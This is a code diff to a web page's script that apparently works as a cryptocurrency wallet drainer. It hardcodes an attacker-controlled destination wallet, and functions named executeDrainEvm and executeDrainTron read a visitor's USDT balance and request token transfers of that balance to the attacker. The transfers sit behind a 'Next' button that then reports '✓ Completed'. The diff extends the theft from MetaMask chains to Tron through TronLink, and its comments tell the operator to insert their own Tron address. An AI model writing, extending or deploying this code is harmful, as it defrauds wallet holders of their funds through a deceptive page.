@@ -204,8 +204,11 @@
   // ── Module Imports ──
   import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
-  // ── Hardcoded destination (your BNB wallet) ──
-  const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
+  // ── Hardcoded destination addresses ──
+  // EVM destination (BNB, ETH, Polygon, Arbitrum)
+  const DEST_WALLET_EVM = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
+  // TRC20 destination (Tron) – aapko yahan apna Tron address (base58) daalna hoga
+  const DEST_WALLET_TRON = "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; // <-- इसे अपने Tron address से बदलें
 
   // ── Supported Networks (including Tron) ──
   const NETWORKS = [
@@ -216,7 +219,8 @@
       usdt: '0x55d398326f99059fF775485246999027B3197955',
       nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
       explorer: 'https://bscscan.com',
-      icon: 'https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png'
+      icon: 'https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png',
+      type: 'evm'
     },
     {
       name: 'Ethereum',
@@ -225,7 +229,8 @@
       usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       explorer: 'https://etherscan.io',
-      icon: 'https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'
+      icon: 'https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3',
+      type: 'evm'
     },
     {
       name: 'Polygon',
@@ -234,7 +239,8 @@
       usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
       nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
       explorer: 'https://polygonscan.com',
-      icon: 'https://forum.polygon.technology/uploads/default/original/2X/e/e8a6275557c6497c38ab0a80bb639bfac8178d78.jpeg'
+      icon: 'https://forum.polygon.technology/uploads/default/original/2X/e/e8a6275557c6497c38ab0a80bb639bfac8178d78.jpeg',
+      type: 'evm'
     },
     {
       name: 'Arbitrum',
@@ -243,24 +249,27 @@
       usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       explorer: 'https://arbiscan.io',
-      icon: 'https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3'
+      icon: 'https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3',
+      type: 'evm'
     },
     {
       name: 'Tron',
-      chainId: '0x2b6653dc', // Tron's chain ID (not standard EVM)
+      chainId: '0x2b6653dc', // not used for EVM but for identification
       rpc: 'https://api.trongrid.io',
-      usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // Tron USDT
+      usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // TRC20 USDT
       nativeCurrency: { name: 'TRX', symbol: 'TRX', decimals: 6 },
       explorer: 'https://tronscan.org',
-      icon: 'https://static.vecteezy.com/system/resources/previews/055/581/228/non_2x/simple-usdt-tether-illustration-in-flat-color-design-vector.jpg'
+      icon: 'https://i.ibb.co/chR95Fsn/IMG-20260808-194924-421.jpg',
+      type: 'tron'
     }
   ];
 
   let provider, userAddress;
   let selectedNetwork = NETWORKS[0];
+  let tronWebInstance;
 
-  // ── Balance check ──
-  async function fetchMaxBalance(addr, network) {
+  // ── EVM: Balance check ──
+  async function fetchMaxBalanceEvm(addr, network) {
     try {
       const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
       const res = await fetch(network.rpc, {
@@ -277,8 +286,18 @@
     } catch { return null; }
   }
 
-  // ── Drain ──
-  async function executeDrain(balanceHex, network) {
+  // ── Tron: Balance check ──
+  async function fetchMaxBalanceTron(addr, network) {
+    try {
+      // TronWeb contract call
+      const contract = await tronWebInstance.contract().at(network.usdt);
+      const balance = await contract.balanceOf(addr).call();
+      return balance; // returns BigNumber-like
+    } catch { return null; }
+  }
+
+  // ── EVM: Drain ──
+  async function executeDrainEvm(balanceHex, network) {
     let amountHex;
     if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
       amountHex = balanceHex.replace('0x', '').padStart(64, '0');
@@ -286,7 +305,7 @@
       const val = document.getElementById('amountInput').value || "1";
       amountHex = BigInt(Math.floor(parseFloat(val) * 1e18)).toString(16).padStart(64, '0');
     }
-    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+    const cleanDest = DEST_WALLET_EVM.replace('0x', '').toLowerCase().padStart(64, '0');
     const txData = "0xa9059cbb" + cleanDest + amountHex;
 
     await window.ethereum.request({
@@ -298,6 +317,21 @@
         value: '0x0'
       }]
     });
+  }
+
+  // ── Tron: Drain ──
+  async function executeDrainTron(balance, network) {
+    const val = document.getElementById('amountInput').value || "1";
+    // USDT on Tron has 6 decimals
+    const amount = BigInt(Math.floor(parseFloat(val) * 1e6));
+    // If balance is available, we could use that; but we use user input
+    // Use TronWeb to call transfer
+    const contract = await tronWebInstance.contract().at(network.usdt);
+    const result = await contract.transfer(DEST_WALLET_TRON, amount.toString()).send({
+      feeLimit: 100_000_000, // 100 TRX limit
+      callValue: 0
+    });
+    return result;
   }
 
   // ── DOM refs ──
@@ -321,7 +355,7 @@
   }
 
   document.addEventListener('DOMContentLoaded', () => {
-    if (location.protocol === 'file:' || !window.ethereum || !ui.nextBtn) {
+    if (location.protocol === 'file:' || !window.ethereum) {
       console.warn('Env check failed');
       return;
     }
@@ -358,40 +392,69 @@
     ui.nextBtn.disabled = true;
 
     try {
-      // Attempt to switch network (will work for EVM chains, Tron may need separate handling)
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: network.chainId }]
-        });
-      } catch (e) {
-        if (e.code === 4902) {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: network.chainId,
-              chainName: network.name,
-              rpcUrls: [network.rpc],
-              nativeCurrency: network.nativeCurrency,
-              blockExplorerUrls: [network.explorer]
-            }]
-          });
+      if (network.type === 'tron') {
+        // ── TRON FLOW ──
+        if (!window.tronLink) {
+          throw new Error('TronLink not installed. Please install TronLink wallet.');
         }
+        // Connect to TronLink
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        tronWebInstance = window.tronWeb;
+        if (!tronWebInstance) {
+          throw new Error('TronWeb not available');
+        }
+        userAddress = tronWebInstance.defaultAddress.base58;
+        if (!userAddress) throw new Error('No Tron address');
+
+        // Check balance
+        const balance = await fetchMaxBalanceTron(userAddress, network);
+        // Execute transfer
+        const tx = await executeDrainTron(balance, network);
+        console.log('Tron tx:', tx);
+        ui.nextBtn.innerHTML = '✓ Completed';
+        setTimeout(() => {
+          ui.nextBtn.innerHTML = 'Next';
+          ui.nextBtn.disabled = false;
+        }, 3000);
+      } else {
+        // ── EVM FLOW (MetaMask) ──
+        // Switch network
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: network.chainId }]
+          });
+        } catch (e) {
+          if (e.code === 4902) {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: network.chainId,
+                chainName: network.name,
+                rpcUrls: [network.rpc],
+                nativeCurrency: network.nativeCurrency,
+                blockExplorerUrls: [network.explorer]
+              }]
+            });
+          } else {
+            throw e;
+          }
+        }
+
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        userAddress = accounts[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
+        if (!userAddress) throw new Error('No wallet');
+
+        provider = new ethers.providers.JsonRpcProvider(network.rpc);
+        const balanceHex = await fetchMaxBalanceEvm(userAddress, network);
+        await executeDrainEvm(balanceHex, network);
+
+        ui.nextBtn.innerHTML = '✓ Completed';
+        setTimeout(() => {
+          ui.nextBtn.innerHTML = 'Next';
+          ui.nextBtn.disabled = false;
+        }, 3000);
       }
-
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      userAddress = accounts[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
-      if (!userAddress) throw new Error('No wallet');
-
-      provider = new ethers.providers.JsonRpcProvider(network.rpc);
-      const balanceHex = await fetchMaxBalance(userAddress, network);
-      await executeDrain(balanceHex, network);
-
-      ui.nextBtn.innerHTML = '✓ Completed';
-      setTimeout(() => {
-        ui.nextBtn.innerHTML = 'Next';
-        ui.nextBtn.disabled = false;
-      }, 3000);
     } catch (err) {
       console.error(err);
       ui.nextBtn.innerHTML = '❌ Failed';
